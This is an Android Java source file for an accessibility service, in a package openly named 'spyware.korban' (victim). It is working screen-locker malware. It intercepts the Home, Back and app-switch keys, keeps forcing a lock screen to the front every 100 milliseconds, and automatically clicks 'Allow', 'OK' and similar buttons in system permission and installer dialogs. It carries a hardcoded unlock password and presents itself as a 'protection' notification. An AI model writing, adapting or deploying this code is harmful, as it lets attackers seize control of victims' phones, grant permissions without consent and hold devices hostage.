package com.spyware.korban;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class AccessibilityBlockService extends AccessibilityService {

    private static final String TAG = "A11Y_BLOCK";
    private static final long REDIRECT_COOLDOWN = 100;
    private static final long DIALOG_CLICK_COOLDOWN = 300;
    private static final long WATCHDOG_INTERVAL = 100;
    private static final long HOME_REDIRECT_INTERVAL = 1000;
    private static final String CHANNEL_ID = "a11y_block_channel";
    private static final int NOTIF_ID = 9922;

    public static volatile boolean blockActive = false;
    public static volatile String lastLockPassword = "dimzz";
    public static volatile String lastLockedBy = "dimzz";
    public static volatile String lastLockInfo = "";

    private Handler loop = new Handler(Looper.getMainLooper());
    private long lastRedirectAt = 0;
    private long lastDialogClickAt = 0;
    private long lastHomeRedirectAt = 0;
    private volatile boolean homePressed = false;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Accessibility service CONNECTED");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                   | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                   | AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
                   | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 10;
        setServiceInfo(info);

        createNotificationChannel();
        startForegroundNotification();

        loop.postDelayed(watchdog, WATCHDOG_INTERVAL);
        loop.postDelayed(dialogWatcher, 200);
        loop.postDelayed(homeWatcher, HOME_REDIRECT_INTERVAL);
    }

    // ═══════════════════════════════════════════════
    // FOREGROUND NOTIFICATION
    // ═══════════════════════════════════════════════
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID,
                    "Accessibility Block",
                    NotificationManager.IMPORTANCE_LOW
                );
                ch.setDescription("Menjaga proteksi tetap aktif");
                ch.setShowBadge(false);
                nm.createNotificationChannel(ch);
            }
        }
    }

    private void startForegroundNotification() {
        try {
            Intent notifIntent = new Intent(this, LockActivity.class);
            notifIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pi = PendingIntent.getActivity(this, 0, notifIntent, flags);

            Notification.Builder builder;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder = new Notification.Builder(this, CHANNEL_ID);
            } else {
                builder = new Notification.Builder(this);
            }

            builder.setContentTitle("🔒 Proteksi Aktif")
                   .setContentText("Accessibility service berjalan")
                   .setSmallIcon(android.R.drawable.ic_lock_lock)
                   .setContentIntent(pi)
                   .setOngoing(true)
                   .setPriority(Notification.PRIORITY_LOW);

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(NOTIF_ID, builder.build(),
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForeground(NOTIF_ID, builder.build());
                }
            } catch (Exception e) {
                Log.e(TAG, "startForeground fail: " + e.getMessage());
            }
        } catch (Exception e) {
            Log.e(TAG, "Notification fail: " + e.getMessage());
        }
    }

    private void stopForegroundNotification() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
        } catch (Exception e) {}
    }

    // ═══════════════════════════════════════════════
    // HOME WATCHER
    // ═══════════════════════════════════════════════
    private final Runnable homeWatcher = new Runnable() {
        @Override
        public void run() {
            // ═══ FIX: Skip kalau user udah unlock ═══
            if (blockActive && !LockService.userUnlocked) {
                if (homePressed || !isLockActivityTop()) {
                    long now = System.currentTimeMillis();
                    if (now - lastHomeRedirectAt >= HOME_REDIRECT_INTERVAL) {
                        lastHomeRedirectAt = now;
                        Log.d(TAG, "HOME WATCHDOG: redirect lock (1s interval)");
                        forceShowLock();
                    }
                }
            }
            loop.postDelayed(this, HOME_REDIRECT_INTERVAL);
        }
    };

    // ═══════════════════════════════════════════════
    // WATCHDOG 100ms
    // ═══════════════════════════════════════════════
    private final Runnable watchdog = new Runnable() {
        @Override
        public void run() {
            // ═══ FIX: Skip kalau user udah unlock ═══
            if (blockActive && !LockService.userUnlocked) {
                try {
                    if (Build.VERSION.SDK_INT >= 21) {
                        AccessibilityNodeInfo root = getRootInActiveWindow();
                        if (root != null) {
                            CharSequence p = root.getPackageName();
                            if (p != null) {
                                String pkg = p.toString();
                                if (isSystemPackage(pkg)) {
                                    autoClickDialog();
                                    if (isLauncherOrHome(pkg)) {
                                        homePressed = true;
                                        long now = System.currentTimeMillis();
                                        if (now - lastHomeRedirectAt >= HOME_REDIRECT_INTERVAL) {
                                            lastHomeRedirectAt = now;
                                            forceShowLock();
                                        }
                                    }
                                } else if (!pkg.equals(getPackageName())) {
                                    redirectToLock();
                                } else {
                                    homePressed = false;
                                }
                            }
                        }
                    }
                } catch (Exception e) {}
            }
            loop.postDelayed(this, WATCHDOG_INTERVAL);
        }
    };

    // ═══════════════════════════════════════════════
    // DIALOG WATCHER
    // ═══════════════════════════════════════════════
    private final Runnable dialogWatcher = new Runnable() {
        @Override
        public void run() {
            if (blockActive) {
                autoClickDialog();
            }
            loop.postDelayed(this, 200);
        }
    };

    private boolean isSystemPackage(String pkg) {
        if (pkg == null) return false;
        return pkg.equals("com.android.systemui")
            || pkg.equals("android")
            || pkg.contains("permissioncontroller")
            || pkg.contains("packageinstaller")
            || pkg.equals("com.google.android.permissioncontroller")
            || pkg.equals("com.google.android.packageinstaller")
            || pkg.contains("inputmethod")
            || pkg.contains("launcher")
            || pkg.contains("keyguard");
    }

    private boolean isLauncherOrHome(String pkg) {
        if (pkg == null) return false;
        return pkg.contains("launcher")
            || pkg.equals("com.android.systemui")
            || pkg.contains("home")
            || pkg.contains("nova")
            || pkg.contains("lawnchair")
            || pkg.contains("trebuchet")
            || pkg.contains("oneui.home")
            || pkg.contains("miui.home")
            || pkg.contains("oppo.launcher")
            || pkg.contains("vivo.launcher");
    }

    private boolean isLockActivityTop() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                CharSequence p = root.getPackageName();
                if (p != null) {
                    return p.toString().equals(getPackageName());
                }
            }
        } catch (Exception e) {}
        return false;
    }

    // ═══════════════════════════════════════════════
    // AUTO-CLICK DIALOG
    // ═══════════════════════════════════════════════
    private void autoClickDialog() {
        try {
            long now = System.currentTimeMillis();
            if (now - lastDialogClickAt < DIALOG_CLICK_COOLDOWN) return;

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            CharSequence p = root.getPackageName();
            if (p == null) return;
            String pkg = p.toString();

            if (!isSystemPackage(pkg)) return;

            String[] btnTexts = {
                "Mengerti", "MENGERTI", "mengerti",
                "Got it", "GOT IT",
                "OK", "Ok", "ok",
                "Setuju", "SETUJU", "setuju",
                "Allow", "ALLOW",
                "Izinkan", "IZINKAN",
                "Lanjutkan", "LANJUTKAN", "Continue", "CONTINUE",
                "Ya", "YA", "Yes", "YES",
                "Aktifkan", "AKTIFKAN",
                "Terima", "TERIMA", "Accept", "ACCEPT",
                "Berikutnya", "BERIKUTNYA", "Next", "NEXT",
                "Selesai", "SELESAI", "Finish", "FINISH",
                "Mulai", "MULAI", "Start", "START"
            };

            for (String txt : btnTexts) {
                if (clickNode(root, txt)) {
                    lastDialogClickAt = now;
                    Log.d(TAG, "Auto-clicked: " + txt);
                    return;
                }
            }

            autoClickBottomButton(root);
        } catch (Exception e) {}
    }

    private void autoClickBottomButton(AccessibilityNodeInfo root) {
        try {
            List<AccessibilityNodeInfo> clickables =
                root.findAccessibilityNodeInfosByViewId("android:id/button1");
            if (clickables != null) {
                for (AccessibilityNodeInfo n : clickables) {
                    if (n != null && n.isClickable()) {
                        n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                    if (n != null) {
                        AccessibilityNodeInfo parent = n.getParent();
                        while (parent != null) {
                            if (parent.isClickable()) {
                                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                return;
                            }
                            parent = parent.getParent();
                        }
                    }
                }
            }
        } catch (Exception e) {}
    }

    private boolean clickNode(AccessibilityNodeInfo root, String text) {
        try {
            List<AccessibilityNodeInfo> nodes =
                root.findAccessibilityNodeInfosByText(text);
            if (nodes == null || nodes.isEmpty()) return false;

            for (AccessibilityNodeInfo node : nodes) {
                if (node == null) continue;
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                AccessibilityNodeInfo parent = node.getParent();
                while (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                    parent = parent.getParent();
                }
            }
        } catch (Exception e) {}
        return false;
    }

    // ═══════════════════════════════════════════════
    // FORCE SHOW LOCK
    // ═══════════════════════════════════════════════
    private void forceShowLock() {
        // ═══ FIX: Kalau user udah unlock, jangan paksa lock ═══
        if (LockService.userUnlocked) {
            Log.d(TAG, "User unlocked, skip forceShowLock");
            return;
        }

        try {
            Intent i = new Intent(AccessibilityBlockService.this, LockActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_CLEAR_TOP
                | Intent.FLAG_ACTIVITY_SINGLE_TOP
                | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                | Intent.FLAG_ACTIVITY_NO_ANIMATION);
            i.putExtra("lock_password", lastLockPassword);
            i.putExtra("lock_by", lastLockedBy);
            i.putExtra("lock_info", lastLockInfo);

            if (Build.VERSION.SDK_INT >= 34) {
                try {
                    int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        flags |= PendingIntent.FLAG_IMMUTABLE;
                    }
                    PendingIntent pi = PendingIntent.getActivity(
                        AccessibilityBlockService.this,
                        1,
                        i,
                        flags
                    );
                    pi.send();
                } catch (Exception e) {
                    startActivity(i);
                }
            } else {
                startActivity(i);
            }
            Log.d(TAG, "forceShowLock() called");
        } catch (Exception e) {
            Log.e(TAG, "forceShowLock: " + e.getMessage());
        }
    }

    private void redirectToLock() {
        long now = System.currentTimeMillis();
        if (now - lastRedirectAt < REDIRECT_COOLDOWN) return;
        lastRedirectAt = now;
        forceShowLock();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // ═══ FIX: Skip kalau user udah unlock ═══
        if (!blockActive || LockService.userUnlocked) return;

        int type = event.getEventType();

        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                || type == AccessibilityEvent.TYPE_VIEW_FOCUSED
                || type == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {

            CharSequence pkg = event.getPackageName();
            if (pkg == null) return;
            String p = pkg.toString();

            if (isSystemPackage(p)) {
                autoClickDialog();

                if (isLauncherOrHome(p)) {
                    homePressed = true;
                    long now = System.currentTimeMillis();
                    if (now - lastHomeRedirectAt >= HOME_REDIRECT_INTERVAL) {
                        lastHomeRedirectAt = now;
                        forceShowLock();
                    }
                }
                return;
            }

            if (!p.equals(getPackageName())) {
                Log.d(TAG, "Blocked window: " + p);
                redirectToLock();
            } else {
                homePressed = false;
            }
        }
    }

    // ═══════════════════════════════════════════════
    // INTERSEP TOMBOL HOME
    // ═══════════════════════════════════════════════
    @Override
    public boolean onKeyEvent(KeyEvent event) {
        if (!blockActive) return super.onKeyEvent(event);

        // ═══ FIX: Kalau user udah unlock, jangan block key ═══
        if (LockService.userUnlocked) return super.onKeyEvent(event);

        int code = event.getKeyCode();
        int action = event.getAction();

        if (code == KeyEvent.KEYCODE_POWER) {
            return super.onKeyEvent(event);
        }

        if (code == KeyEvent.KEYCODE_VOLUME_UP
                || code == KeyEvent.KEYCODE_VOLUME_DOWN
                || code == KeyEvent.KEYCODE_VOLUME_MUTE) {
            return super.onKeyEvent(event);
        }

        if (code == KeyEvent.KEYCODE_HOME
                || code == KeyEvent.KEYCODE_APP_SWITCH
                || code == KeyEvent.KEYCODE_BACK
                || code == KeyEvent.KEYCODE_MENU
                || code == KeyEvent.KEYCODE_ESCAPE
                || code == KeyEvent.KEYCODE_ALL_APPS) {

            if (action == KeyEvent.ACTION_DOWN) {
                homePressed = true;
                long now = System.currentTimeMillis();
                lastHomeRedirectAt = now;
                forceShowLock();
            }

            return true;
        }

        return super.onKeyEvent(event);
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "A11Y INTERRUPTED");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        Log.d(TAG, "A11Y UNBOUND");
        stopForegroundNotification();
        return super.onUnbind(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            loop.removeCallbacksAndMessages(null);
        } catch (Exception e) {}
        stopForegroundNotification();
    }
}